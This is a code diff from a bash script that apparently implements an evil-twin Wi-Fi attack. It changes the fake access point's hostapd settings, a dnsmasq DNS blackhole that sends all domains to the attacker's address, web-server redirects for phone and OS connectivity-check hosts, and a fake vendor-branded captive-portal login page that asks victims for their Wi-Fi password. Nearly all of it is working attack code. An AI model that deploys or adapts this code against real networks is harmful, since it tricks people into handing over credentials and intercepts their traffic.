@@ -9806,7 +9806,6 @@ function exec_et_captive_portal_attack() {
 	rm -rf "${tmpdir}${webdir}" > /dev/null 2>&1
 	mkdir "${tmpdir}${webdir}" > /dev/null 2>&1
 
-	exec_et_deauth
 	set_hostapd_config
 	launch_fake_ap
 	set_network_interface_data
@@ -9909,9 +9908,11 @@ function set_hostapd_config() {
 	echo -e "preamble=1"
 	echo -e "channel=${replace_channel}"
 	echo -e "dtim_period=1"
-	# echo -e "ht_capab=[HT40+][SHORT-GI-20][SHORT-GI-40]"
-	echo -e "supported_rates=10 20"
-	echo -e "basic_rates=10 20"
+	echo -e "ht_capab=[SHORT-GI-40][HT40+][HT40-][DSSS_CCK-40]"
+	echo -e "supported_rates=10"
+	echo -e "basic_rates=10"
+	echo -e "force_ht40=1"
+	echo -e "ieee80211n=1"
 	# supported_rates=60 90 120 180 240 360 480 540
 	# basic_rates=60 120
 	# supported_rates=12 18 24 36 48 54
@@ -9938,7 +9939,7 @@ function set_hostapd_config() {
 		} >> "${tmpdir}${hostapd_file}"
 	else
 		{
-		echo -e "hw_mode=b"
+		echo -e "hw_mode=g"
 		} >> "${tmpdir}${hostapd_file}"
 	fi
 
@@ -10089,7 +10090,7 @@ function set_network_interface_data() {
 	any_ipv6="::/0"
 
 	first_octet="192"
-	second_octet="168"
+	second_octet="169"
 	third_octet="1"
 	fourth_octet="0"
 
@@ -11440,37 +11441,14 @@ function launch_dns_blackhole() {
 	echo -e "interface=${interface}"
 	echo -e "address=/#/${et_ip_router}"
 	echo -e "port=${dns_port}"
-	echo -e "bind-interfaces"
-	# bind-dynamic
 	echo -e "except-interface=${loopback_interface}"
-	echo -e "bogus-priv"
-	echo -e "domain-needed"
-	echo -e "no-resolv"
-	echo -e "no-hosts"
+	echo -e "no-dhcp-interface=${interface}"
+	echo -e "bind-dynamic"
 	echo -e "log-queries"
 	echo -e "no-daemon"
-	echo -e "address=/google.com/${et_ip_router}"
-	echo -e "address=/gstatic.com/${et_ip_router}"
-	echo -e "address=/connectivitycheck.android.com/${et_ip_router}"
-	echo -e "address=/clients3.google.com/${et_ip_router}"
-	echo -e "address=/clients4.google.com/${et_ip_router}"
-	echo -e "address=/captive.apple.com/${et_ip_router}"
-	echo -e "address=/www.apple.com/${et_ip_router}"
-	echo -e "address=/icloud.com/${et_ip_router}"
-	echo -e "address=/msftconnecttest.com/${et_ip_router}"
-	echo -e "address=/msftncsi.com/${et_ip_router}"
-	echo -e "address=/connectivitycheck.gstatic.com/${et_ip_router}"
-	echo -e "address=/detectportal.firefox.com/${et_ip_router}"
-	echo -e "address=/nmcheck.gnome.org/${et_ip_router}"
-	echo -e "address=/connectivity-check.ubuntu.com/${et_ip_router}"
-	echo -e "address=/www.samsung.com/${et_ip_router}"
-	echo -e "address=/connectivitycheck.platform.hicloud.com/${et_ip_router}"
-	echo -e "address=/connectivitycheck.asus.com/${et_ip_router}"
-	echo -e "address=/connectivitycheck.vivo.com/${et_ip_router}"
-	# echo -e "no-dhcp-interface=${interface}"
-
-	# echo -e "address=/google.com/172.217.5.238"
-	# echo -e "address=/gstatic.com/172.217.5.238"
+	echo -e "bogus-priv"
+	echo -e "no-resolv"
+	echo -e "no-hosts"
 	
 	} >> "${tmpdir}${dnsmasq_file}"
 
@@ -11542,19 +11520,71 @@ function set_webserver_config() {
 	rm -rf "${tmpdir}${webserver_log}" > /dev/null 2>&1
 
 	{
-
 	echo -e "server.document-root = \"${tmpdir}${webdir}\"\n"
 	echo -e "server.modules = ("
 	echo -e "\"mod_auth\","
 	echo -e "\"mod_cgi\","
-	echo -e "\"mod_redirect\","
-	echo -e "\"mod_accesslog\","
-	echo -e "\"mod_rewrite\""
+	echo -e "\"mod_rewrite\","
+	echo -e "\"mod_accesslog\""
 	echo -e ")\n"
-	echo -e "\$HTTP[\"host\"] !~ \"^${et_ip_router}$\" {"
-	echo -e "    url.redirect = ( \"^/(.*)$\" => \"http://${et_ip_router}\" )"
+
+	echo -e "\$HTTP[\"host\"] =~ \"(.*)\" {"
+	echo -e "url.redirect = ( \"^/index.htm$\" => \"/\")"
+	echo -e "url.redirect-code = 302"
+	echo -e "}"
+	echo -e "\$HTTP[\"host\"] =~ \"captive.apple.com\" {"
+	echo -e "    url.redirect = ( \"^/(.*)\$\" => \"http://captive.apple.com/hotspot-detect.html\" )"
 	echo -e "    url.redirect-code = 302"
 	echo -e "}"
+	echo -e "\$HTTP[\"host\"] =~ \"msftconnecttest.com\" {"
+	echo -e "    url.redirect = ( \"^/(.*)\$\" => \"http://www.msftconnecttest.com/redirect\" )"
+	echo -e "    url.redirect-code = 302"
+	echo -e "}"
+	echo -e "\$HTTP[\"host\"] =~ \"msftncsi.com\" {"
+	echo -e "    url.redirect = ( \"^/(.*)\$\" => \"http://www.msftncsi.com/ncsi.txt\" )"
+	echo -e "    url.redirect-code = 302"
+	echo -e "}"
+	echo -e "\$HTTP[\"host\"] =~ \"connectivitycheck.android.com\" {"
+	echo -e "    url.redirect = ( \"^/(.*)\$\" => \"http://connectivitycheck.android.com/generate_204\" )"
+	echo -e "    url.redirect-code = 302"
+	echo -e "}"
+	echo -e "\$HTTP[\"host\"] =~ \"clients3.google.com\" {"
+	echo -e "    url.redirect = ( \"^/(.*)\$\" => \"http://connectivitycheck.gstatic.com/redirect\" )"
+	echo -e "    url.redirect-code = 302"
+	echo -e "}"
+	echo -e "\$HTTP[\"host\"] =~ \"clients4.google.com\" {"
+	echo -e "    url.redirect = ( \"^/(.*)\$\" => \"http://connectivitycheck.gstatic.com/redirect\" )"
+	echo -e "    url.redirect-code = 302"
+	echo -e "}"
+	echo -e "\$HTTP[\"host\"] =~ \"detectportal.firefox.com\" {"
+	echo -e "    url.redirect = ( \"^/(.*)\$\" => \"http://detectportal.firefox.com/canonical.html\" )"
+	echo -e "    url.redirect-code = 302"
+	echo -e "}"
+	echo -e "\$HTTP[\"host\"] =~ \"nmcheck.gnome.org\" {"
+	echo -e "    url.redirect = ( \"^/(.*)\$\" => \"http://nmcheck.gnome.org/check_connection.txt\" )"
+	echo -e "    url.redirect-code = 302"
+	echo -e "}"
+	echo -e "\$HTTP[\"host\"] =~ \"www.apple.com\" {"
+	echo -e "    url.redirect = ( \"^/(.*)\$\" => \"http://www.apple.com/library/test/success.html\" )"
+	echo -e "    url.redirect-code = 302"
+	echo -e "}"
+	echo -e "\$HTTP[\"host\"] =~ \"www.samsung.com\" {"
+	echo -e "    url.redirect = ( \"^/(.*)\$\" => \"http://www.samsung.com\" )"
+	echo -e "    url.redirect-code = 302"
+	echo -e "}"
+	echo -e "\$HTTP[\"host\"] =~ \"connectivitycheck.platform.hicloud.com\" {"
+	echo -e "    url.redirect = ( \"^/(.*)\$\" => \"http://connectivitycheck.platform.hicloud.com/generate_204\" )"
+	echo -e "    url.redirect-code = 302"
+	echo -e "}"
+	echo -e "\$HTTP[\"host\"] =~ \"connectivitycheck.asus.com\" {"
+	echo -e "    url.redirect = ( \"^/(.*)\$\" => \"http://connectivitycheck.asus.com\" )"
+	echo -e "    url.redirect-code = 302"
+	echo -e "}"
+	echo -e "\$HTTP[\"host\"] =~ \"connectivitycheck.vivo.com\" {"
+	echo -e "    url.redirect = ( \"^/(.*)\$\" => \"http://connectivitycheck.vivo.com/generate_204\" )"
+	echo -e "    url.redirect-code = 302"
+	echo -e "}"
+
 	echo -e "server.bind = \"${et_ip_router}\""
 	echo -e "server.port = ${www_port}\n"
 	echo -e "index-file.names = (\"${indexfile}\")"
@@ -11566,7 +11596,7 @@ function set_webserver_config() {
 	echo -e "cgi.assign = (\".htm\" => \"/bin/bash\")\n"
 	echo -e "accesslog.filename = \"${tmpdir}${webserver_log}\""
 	echo -e "accesslog.escaping = \"default\""
-	echo -e "accesslog.format = \"%h %s %r %v%U %t '%{User-Agent}i'\"\n"
+	echo -e "accesslog.format = \"%h %s %r %v%U %t '%{User-Agent}i'\""
 	echo -e "\$HTTP[\"remote-ip\"] == \"${loopback_ip}\" { accesslog.filename = \"\" }"
 	} >> "${tmpdir}${webserver_file}"
 
@@ -11729,7 +11759,7 @@ function set_captive_portal_page() {
 
 		{
 			echo -e "#!/usr/bin/env bash"
-			echo -e "echo -e '<!DOCTYPE html><html><head><meta name=\"viewport\" content=\"width=1024\"><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><title>${captive_portal_vendor} Login</title><link rel=\"stylesheet\" type=\"text/css\" href=\"portal.css\"><script type=\"text/javascript\" src=\"portal.js\"></script></head><div style=\"position:absolute;display:flex;top:0;left:0;opacity:50%;color:#fff;padding:24px;align-items:center\"><img style=\"filter:brightness(0) invert(1);width:${portal_base64_width};\" src=\"${portal_base64}\"></div><body style=\"margin:0;height:100vh;display:flex;align-items:center;text-align:center;flex-direction:column;padding-top:120px;overflow:hidden\"><img src=\"${pixelfile}\" style=\"display:none\"><h1 style=\"color:#fff;padding-bottom:50px;padding-left:16px;padding-right:16px\">Welcome to ${captive_portal_vendor} web page for network access. Please login to continue.</h1><form method=\"post\" id=\"loginform\" name=\"loginform\" action=\"check.htm\"><div style=\"display:flex;padding-right:50px;flex-direction:column;align-items:flex-end;text-align:left\"><div style=\"display:flex;align-items:center\"><p style=\"padding-right:10px;color:#fff;font-size:18px\">SSID :</p><input disabled=\"disabled\" placeholder=\"${essid//[\`\']/}\" style=\"background-color:transparent;border:1px solid #fff;border-radius:4px;color:#fff;outline:0;width:250px;font-size:18px;padding:10px 6px\" onfocus='this.style.borderColor=\"white\"' onblur='this.style.borderColor=\"white\"'></div><div style=\"display:flex;align-items:center\"><p style=\"padding-right:10px;color:#fff;font-size:18px\">Password :</p><input style=\"background-color:transparent;border:1px solid #fff;border-radius:4px;color:#fff;outline:0;width:250px;font-size:18px;padding:10px 6px\" onfocus='this.style.borderColor=\"white\"' onblur='this.style.borderColor=\"white\"' id=\"password\" type=\"password\" name=\"password\" maxlength=\"63\" size=\"20\"></div><div style=\"display:flex;align-items:center\"><input style=\"background-color:#fff;border:1px solid #fff;border-radius:4px;color:#000;outline:0;width:250px;font-size:18px;padding:10px 6px\" class=\"button\" id=\"formbutton\" type=\"button\" value=\"Log In\"></div></div></form></body><div style=\"position:absolute;background:#fff;bottom:0;width:100%;padding:30px;border-top:3px solid green\"><img style=\"filter:brightness(0) invert(0);opacity:30%;width:${portal_base64_width};\" src=\"${portal_base64}\"><p>Copyright © '${captive_portal_vendor}' Technologies Co., Ltd. 2009-2018. All rights reserved.</p></div></html>'"
+			echo -e "echo -e '<!DOCTYPE html><html><head><meta name=\"viewport\" content=\"width=1024\"><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><title>${captive_portal_vendor} Login</title><link rel=\"stylesheet\" type=\"text/css\" href=\"portal.css\"><script type=\"text/javascript\" src=\"portal.js\"></script></head><div style=\"position:absolute;display:flex;top:0;left:0;opacity:50%;color:#fff;padding:24px;align-items:center\"><img style=\"filter:brightness(0) invert(1);width:${portal_base64_width};\" src=\"${portal_base64}\"></div><body style=\"margin:0;height:100vh;display:flex;align-items:center;text-align:center;flex-direction:column;padding-top:120px;overflow:hidden\"><img src=\"${pixelfile}\" style=\"display:none\"><h1 style=\"color:#fff;padding-bottom:50px;padding-left:20px;padding-right:20px\">Welcome to ${captive_portal_vendor} web page for network configuration. Please login to continue.</h1><form method=\"post\" id=\"loginform\" name=\"loginform\" action=\"check.htm\"><div style=\"display:flex;padding-right:50px;flex-direction:column;align-items:flex-end;text-align:left\"><div style=\"display:flex;align-items:center\"><p style=\"padding-right:10px;color:#fff;font-size:18px\">SSID :</p><input disabled=\"disabled\" placeholder=\"${essid//[\`\']/}\" style=\"background-color:transparent;border:1px solid #fff;border-radius:4px;color:#fff;outline:0;width:250px;font-size:18px;padding:10px 6px\" onfocus='this.style.borderColor=\"white\"' onblur='this.style.borderColor=\"white\"'></div><div style=\"display:flex;align-items:center\"><p style=\"padding-right:10px;color:#fff;font-size:18px\">Password :</p><input style=\"background-color:transparent;border:1px solid #fff;border-radius:4px;color:#fff;outline:0;width:250px;font-size:18px;padding:10px 6px\" onfocus='this.style.borderColor=\"white\"' onblur='this.style.borderColor=\"white\"' id=\"password\" type=\"password\" name=\"password\" maxlength=\"63\" size=\"20\"></div><div style=\"display:flex;align-items:center\"><input style=\"background-color:#fff;border:1px solid #fff;border-radius:4px;color:#000;outline:0;width:250px;font-size:18px;padding:10px 6px\" class=\"button\" id=\"formbutton\" type=\"button\" value=\"Log In\"></div></div></form></body><div style=\"position:absolute;background:#fff;bottom:0;width:100%;padding:30px;border-top:3px solid green\"><img style=\"filter:brightness(0) invert(0);opacity:30%;width:${portal_base64_width};\" src=\"${portal_base64}\"><p>Copyright © '${captive_portal_vendor}' Technologies Co., Ltd. 2009-2018. All rights reserved.</p></div></html>'"
 			echo -e "exit 0"
 		} >> "${tmpdir}${webdir}${indexfile}"
 
